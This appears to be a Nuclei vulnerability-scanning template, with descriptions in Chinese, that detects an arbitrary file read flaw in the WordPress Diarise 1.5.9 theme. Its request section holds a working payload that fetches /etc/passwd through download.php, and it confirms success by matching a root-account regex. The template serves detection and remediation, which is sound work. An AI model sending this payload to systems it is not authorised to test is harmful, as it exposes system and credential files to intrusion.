id: diarise-theme-lfi

info:
  name: WordPress Diarise 1.5.9 - Arbitrary File Retrieval
  author: 0x_Akoko
  severity: high
  description: |
    该模板用于检测 WordPress Diarise 1.5.9 - Arbitrary File Retrieval。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://packetstormsecurity.com/files/152773/WordPress-Diarise-1.5.9-Local-File-Disclosure.html
    - https://cxsecurity.com/issue/WLB-2019050123
    - https://woocommerce.com/?aff=1790
  classification:
    cwe-id: CWE-22,CWE-73
  metadata:
    max-request: 1
  tags: packetstorm,wordpress,wp-theme,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
